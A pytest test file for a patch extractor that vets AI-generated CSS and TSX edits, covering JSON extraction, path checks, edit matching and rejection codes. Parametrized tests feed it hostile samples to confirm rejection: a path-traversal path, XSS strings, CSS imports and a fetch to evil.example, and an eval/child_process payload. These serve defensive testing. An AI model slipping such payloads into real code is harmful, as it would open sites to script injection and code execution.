"""W2.6 tests: code-response extraction, structural validation and rejection.

Two layers are covered:

- **pure extraction** — :func:`app.patch_extraction.extract_payload` (raw text
  -> JSON payload, or a reason code), with no filesystem involved;
- **the real extractor** — :class:`app.patch_extraction.SourcePatchExtractor`
  (payload -> paths -> edit applicability -> structural checks), plus a few
  end-to-end runs through the HTTP API.

Nothing here executes, imports or evaluates model text. Every rejection code in
the W2.6 closed list is produced by at least one test (see
``test_every_w2_6_reason_code_is_produced``).
"""

from __future__ import annotations

import json
from pathlib import Path
from uuid import uuid4

import pytest

from app.ai.adapters.patch import MockPatchGenerator
from app.ai.contracts import Finding, FindingCategory, Severity
from app.config import Settings
from app.detection_schemas import FindingRecord
from app.patch_extraction import (
    ExtractionStatus,
    SourcePatchExtractor,
    extract_payload,
)
from app.patch_schemas import RejectionReason
from app.source_context import build_source_context

CSS_TEXT = "#submit {\n  width: 220px;\n  color: red;\n}\n"
TSX_TEXT = "export const Button = () => <button>Buy</button>;\n"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _make_tree(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        # newline="" writes the exact bytes (no os.linesep translation).
        target.write_text(text, encoding="utf-8", newline="")
    return root


def _settings(root, **overrides) -> Settings:
    values: dict = {
        "patch_source_root": str(root),
        "approved_patch_paths": ["styles/**", "src/**"],
    }
    values.update(overrides)
    return Settings(**values)


def _finding(target: str = "#submit") -> Finding:
    return Finding(
        category=FindingCategory.clipped_element,
        target_candidate=target,
        observation="MOCK-injected finding used by extraction tests.",
        severity=Severity.high,
    )


def _body(finding: Finding, path: str, old: str, new: str, **over) -> dict:
    body: dict = {
        "finding_id": finding.finding_id,
        "files": [{"path": path, "edits": [{"old_text": old, "new_text": new}]}],
        "rationale": "minimal fix",
        "generator_label": "MOCK",
    }
    body.update(over)
    return body


def _extract(text: str, finding: Finding, settings: Settings):
    return SourcePatchExtractor(settings).extract(
        text, finding=finding, source_context=build_source_context(finding, settings)
    )


def _seed_finding(detection_store, *, target: str = "#submit") -> str:
    finding = _finding(target)
    record = FindingRecord(
        finding=finding,
        scan_id=uuid4(),
        adapter_label="MOCK",
        is_mock=True,
        route="/checkout",
    )
    detection_store.replace_findings(record.scan_id, [record])
    return finding.finding_id


# ---------------------------------------------------------------------------
# pure extraction: the JSON payload
# ---------------------------------------------------------------------------


def test_whole_text_json_is_used_verbatim():
    result = extract_payload('{"a": 1}', max_bytes=100)
    assert result.text == '{"a": 1}'
    assert result.reasons == ()
    assert result.discarded_prose_chars == 0


def test_single_tagged_fence_is_used_and_prose_discarded():
    text = 'Here you go:\n\n```omnisight-patch\n{"a": 1}\n```\n\nHope that helps!'
    result = extract_payload(text, max_bytes=1000)
    assert result.text == '{"a": 1}'
    assert result.reasons == ()
    assert result.discarded_prose_chars > 0
    assert "Here you go" not in (result.text or "")


def test_two_tagged_fences_are_ambiguous():
    text = '```omnisight-patch\n{"a":1}\n```\n\n```omnisight-patch\n{"b":2}\n```'
    result = extract_payload(text, max_bytes=1000)
    assert result.reasons == (RejectionReason.ambiguous_multiple_patches.value,)


def test_two_untagged_blocks_are_not_a_patch():
    text = "First:\n\n```\nfoo\n```\n\nSecond:\n\n```\nbar\n```\n"
    result = extract_payload(text, max_bytes=1000)
    assert result.reasons == (RejectionReason.no_patch_found.value,)


def test_prose_only_is_no_patch_found():
    result = extract_payload("I would widen the submit button.", max_bytes=1000)
    assert result.reasons == (RejectionReason.no_patch_found.value,)


def test_empty_and_non_text_are_no_patch_found():
    assert extract_payload("", max_bytes=100).reasons == (
        RejectionReason.no_patch_found.value,
    )
    assert extract_payload("   \n", max_bytes=100).reasons == (
        RejectionReason.no_patch_found.value,
    )
    assert extract_payload(None, max_bytes=100).reasons == (
        RejectionReason.no_patch_found.value,
    )


def test_truncated_json_is_truncated():
    result = extract_payload('{"files": [', max_bytes=1000)
    assert result.reasons == (RejectionReason.truncated.value,)


def test_unterminated_fence_is_truncated():
    result = extract_payload('```omnisight-patch\n{"a": 1}', max_bytes=1000)
    assert result.reasons == (RejectionReason.truncated.value,)


def test_oversized_input_is_too_large():
    result = extract_payload("x" * 5000, max_bytes=1000)
    assert result.reasons == (RejectionReason.too_large.value,)


def test_top_level_json_array_is_schema_invalid():
    result = extract_payload("[1, 2, 3]", max_bytes=100)
    assert result.reasons == (RejectionReason.schema_invalid.value,)


def test_crlf_input_is_accepted():
    result = extract_payload('{\r\n  "a": 1\r\n}', max_bytes=100)
    assert result.reasons == ()
    assert result.text is not None


def test_utf8_bom_is_stripped():
    result = extract_payload('\ufeff{"a": 1}', max_bytes=100)
    assert result.reasons == ()
    assert result.text is not None


def test_smart_quotes_are_recovered():
    result = extract_payload('{\u201ca\u201d: 1}', max_bytes=100)
    assert result.reasons == ()


# ---------------------------------------------------------------------------
# extraction -> proposal: acceptance
# ---------------------------------------------------------------------------


def test_accepts_prose_with_one_tagged_patch_and_discards_prose(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    body = json.dumps(_body(finding, "styles/checkout.css", "color: red;", "color: blue;"))
    text = f"Sure, here is a minimal fix:\n\n```omnisight-patch\n{body}\n```\n"

    result = _extract(text, finding, _settings(root))
    assert result.status is ExtractionStatus.accepted
    assert result.reasons == []
    assert result.discarded_prose_chars > 0


def test_accepts_pure_json(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    body = json.dumps(_body(finding, "styles/checkout.css", "color: red;", "color: blue;"))

    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.accepted
    assert result.discarded_prose_chars == 0


def test_accepted_output_equals_the_intended_patch_exactly(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    old, new = "color: red;", "color: blue;"
    body = json.dumps(_body(finding, "styles/checkout.css", old, new))

    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.accepted
    assert result.proposal is not None
    assert result.proposal.finding_id == finding.finding_id
    patch_file = result.proposal.files[0]
    assert patch_file.path == "styles/checkout.css"
    assert patch_file.edits[0].old_text == old
    assert patch_file.edits[0].new_text == new


def test_balanced_jsx_edit_is_accepted(tmp_path):
    root = _make_tree(tmp_path, {"src/Button.tsx": TSX_TEXT})
    finding = _finding("#checkout")
    body = json.dumps(
        _body(finding, "src/Button.tsx", "Buy", "<div><span>Buy</span></div>")
    )
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.accepted


def test_crlf_file_matches_lf_old_text(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": "#a {\r\n  color: red;\r\n}\r\n"})
    finding = _finding()
    # The model answers with CRLF inside old_text; the file is read with
    # universal newlines, so the extractor normalises both sides to `\n`.
    body = json.dumps(_body(finding, "styles/checkout.css", "color: red;\r\n", "color: blue;\n"))
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.accepted, result.message


# ---------------------------------------------------------------------------
# extraction -> proposal: paths
# ---------------------------------------------------------------------------


def test_path_traversal_is_rejected(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    body = json.dumps(_body(finding, "../../etc/passwd.css", "a", "b"))
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.path_unsafe.value]


def test_unapproved_file_is_rejected(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT, "src/app.tsx": TSX_TEXT})
    finding = _finding()
    body = json.dumps(_body(finding, "src/app.tsx", "Buy", "Buy now"))
    result = _extract(body, finding, _settings(root, approved_patch_paths=["styles/**"]))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.path_not_approved.value]


def test_unsupported_extension_is_rejected(tmp_path):
    root = _make_tree(tmp_path, {"styles/logo.png": "binary"})
    finding = _finding()
    body = json.dumps(_body(finding, "styles/logo.png", "a", "b"))
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.unsupported_file_type.value]


# ---------------------------------------------------------------------------
# extraction -> proposal: edit applicability
# ---------------------------------------------------------------------------


def test_absent_old_text_is_not_applicable(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    body = json.dumps(_body(finding, "styles/checkout.css", "color: purple;", "color: blue;"))
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.edit_not_applicable.value]


def test_old_text_matching_twice_is_ambiguous(tmp_path):
    root = _make_tree(
        tmp_path, {"styles/checkout.css": ".a { color: red; }\n.b { color: red; }\n"}
    )
    finding = _finding()
    body = json.dumps(_body(finding, "styles/checkout.css", "color: red;", "color: blue;"))
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.edit_ambiguous.value]


def test_missing_source_root_cannot_confirm_the_edit(tmp_path):
    finding = _finding()
    body = json.dumps(_body(finding, "styles/checkout.css", "color: red;", "color: blue;"))
    result = _extract(body, finding, _settings(tmp_path, patch_source_root=""))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.edit_not_applicable.value]


# ---------------------------------------------------------------------------
# extraction -> proposal: schema
# ---------------------------------------------------------------------------


def test_missing_required_field_is_schema_invalid(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    body = _body(finding, "styles/checkout.css", "color: red;", "color: blue;")
    del body["rationale"]
    result = _extract(json.dumps(body), finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.schema_invalid.value]


def test_finding_id_mismatch_is_schema_invalid(tmp_path):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    body = _body(
        finding, "styles/checkout.css", "color: red;", "color: blue;", finding_id="other"
    )
    result = _extract(json.dumps(body), finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.schema_invalid.value]


# ---------------------------------------------------------------------------
# extraction -> proposal: forbidden constructs
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "new_text",
    [
        "@import url('http://evil.example/x.css');",
        "background: expression(alert(1));",
        "background: url(javascript:alert(1));",
        "#a {",  # unbalanced: opens a block it never closes
    ],
)
def test_forbidden_css_constructs_are_rejected(tmp_path, new_text):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    finding = _finding()
    body = json.dumps(_body(finding, "styles/checkout.css", "color: red;", new_text))
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.forbidden_construct.value]


@pytest.mark.parametrize(
    "new_text",
    [
        "eval('1')",
        "new Function('return 1')",
        "require('child_process')",
        "import fs from 'fs'",
        "new XMLHttpRequest()",
        "document.write('x')",
        "<script>alert(1)</script>",
        "dangerouslySetInnerHTML={{__html: x}}",
        'fetch("http://evil.example/x")',
        "<div><span>Buy</div>",  # unbalanced JSX
    ],
)
def test_forbidden_js_constructs_are_rejected(tmp_path, new_text):
    root = _make_tree(tmp_path, {"src/Button.tsx": TSX_TEXT})
    finding = _finding("#checkout")
    body = json.dumps(_body(finding, "src/Button.tsx", "Buy", new_text))
    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert result.reasons == [RejectionReason.forbidden_construct.value]


# ---------------------------------------------------------------------------
# safety: model text is never executed
# ---------------------------------------------------------------------------


def test_model_text_is_never_executed(tmp_path):
    sentinel = tmp_path / "pwned.txt"
    root = _make_tree(tmp_path, {"src/Button.tsx": TSX_TEXT})
    finding = _finding("#checkout")
    payload = f'eval("require(\\"child_process\\").execSync(\\"echo x > {sentinel}\\")")'
    body = json.dumps(_body(finding, "src/Button.tsx", "Buy", payload))

    result = _extract(body, finding, _settings(root))
    assert result.status is ExtractionStatus.rejected
    assert RejectionReason.forbidden_construct.value in result.reasons
    assert not sentinel.exists()


# ---------------------------------------------------------------------------
# coverage: every W2.6 rejection code is produced
# ---------------------------------------------------------------------------


def test_every_w2_6_reason_code_is_produced(tmp_path):
    root = _make_tree(
        tmp_path,
        {
            "styles/checkout.css": CSS_TEXT,
            "styles/dup.css": ".a { color: red; }\n.b { color: red; }\n",
            "components/Foo.tsx": TSX_TEXT,
        },
    )
    finding = _finding("#checkout")
    settings = _settings(root, approved_patch_paths=["styles/**"])

    produced: set[str] = set()
    # extraction
    produced.update(extract_payload("prose", max_bytes=100).reasons)
    produced.update(
        extract_payload(
            "```omnisight-patch\n{}\n```\n```omnisight-patch\n{}\n```", max_bytes=999
        ).reasons
    )
    produced.update(extract_payload("{", max_bytes=100).reasons)
    produced.update(extract_payload("[1]", max_bytes=100).reasons)
    produced.update(extract_payload("x" * 500, max_bytes=100).reasons)
    # paths
    produced.update(
        _extract(
            json.dumps(_body(finding, "components/Foo.tsx", "Buy", "Buy")),
            finding,
            settings,
        ).reasons
    )
    produced.update(
        _extract(
            json.dumps(_body(finding, "styles/logo.png", "a", "b")), finding, settings
        ).reasons
    )
    # edit applicability
    produced.update(
        _extract(
            json.dumps(_body(finding, "styles/checkout.css", "nope;", "y")),
            finding,
            settings,
        ).reasons
    )
    produced.update(
        _extract(
            json.dumps(
                _body(finding, "styles/dup.css", "color: red;", "color: blue;")
            ),
            finding,
            settings,
        ).reasons
    )
    # payload structure
    produced.update(
        _extract(
            json.dumps(_body(finding, "styles/checkout.css", "color: red;", "#a {")),
            finding,
            settings,
        ).reasons
    )

    required = {
        RejectionReason.no_patch_found.value,
        RejectionReason.ambiguous_multiple_patches.value,
        RejectionReason.truncated.value,
        RejectionReason.schema_invalid.value,
        RejectionReason.path_not_approved.value,
        RejectionReason.unsupported_file_type.value,
        RejectionReason.edit_not_applicable.value,
        RejectionReason.edit_ambiguous.value,
        RejectionReason.forbidden_construct.value,
        RejectionReason.too_large.value,
    }
    assert required.issubset(produced), required - produced


# ---------------------------------------------------------------------------
# end to end through the API with the production (default) extractor
# ---------------------------------------------------------------------------


def _propose(client, finding_id: str):
    return client.post(f"/api/v1/findings/{finding_id}/patch-proposals")


def test_api_accepts_prose_with_fence(tmp_path, patch_client, detection_store):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    client = patch_client(
        generator=MockPatchGenerator("prose_with_fence"), settings=_settings(root)
    )
    finding_id = _seed_finding(detection_store)

    response = _propose(client, finding_id)
    assert response.status_code == 201
    body = response.json()
    assert body["status"] == "proposed"
    assert body["rejection_reasons"] == []
    assert detection_store.get_finding(finding_id).finding.status.value == "patch_proposed"


def test_api_rejects_two_tagged_blocks(tmp_path, patch_client, detection_store):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    client = patch_client(
        generator=MockPatchGenerator("two_tagged_fences"), settings=_settings(root)
    )
    finding_id = _seed_finding(detection_store)

    body = _propose(client, finding_id).json()
    assert body["status"] == "rejected"
    assert RejectionReason.ambiguous_multiple_patches.value in body["rejection_reasons"]


def test_api_exposes_forbidden_construct(tmp_path, patch_client, detection_store):
    root = _make_tree(tmp_path, {"styles/checkout.css": CSS_TEXT})
    generator = MockPatchGenerator(
        override_payload={
            "files": [
                {
                    "path": "styles/checkout.css",
                    "edits": [
                        {
                            "old_text": "color: red;",
                            "new_text": "color: blue; background: expression(alert(1));",
                        }
                    ],
                }
            ]
        }
    )
    client = patch_client(generator=generator, settings=_settings(root))
    finding_id = _seed_finding(detection_store)

    body = _propose(client, finding_id).json()
    assert body["status"] == "rejected"
    assert body["rejection_reasons"] == [RejectionReason.forbidden_construct.value]
    # A rejection never claims the finding.
    assert detection_store.get_finding(finding_id).finding.status.value == "detected"
